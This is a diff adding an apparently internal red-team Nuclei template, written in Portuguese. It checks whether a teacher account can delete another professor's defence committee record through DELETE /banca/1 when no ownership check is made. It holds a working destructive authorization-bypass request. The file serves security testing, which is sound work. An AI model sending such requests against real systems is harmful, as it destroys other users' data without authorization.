@@ -1,0 +1,17 @@
+id: rt04-delete-banca-alheia
+info:
+  name: "TEACHER sem vinculo DELETA banca de outro professor (banca 1 do teacher) - deleteBanca sem ownership"
+  author: redteam-sisdef
+  severity: high
+  description: "DELETE /banca/:id tem so checkRole; deleteBanca apaga sem conferir ownership (o tipo 'unauthorized' do error map nunca e retornado pelo service)."
+  tags: redteam,authz,destructive,integrity
+http:
+  - raw:
+      - |
+        DELETE /banca/1 HTTP/1.1
+        Host: {{Hostname}}
+        Authorization: Bearer {{TOKEN_TEACHER}}
+    matchers:
+      - type: status
+        status:
+          - 204
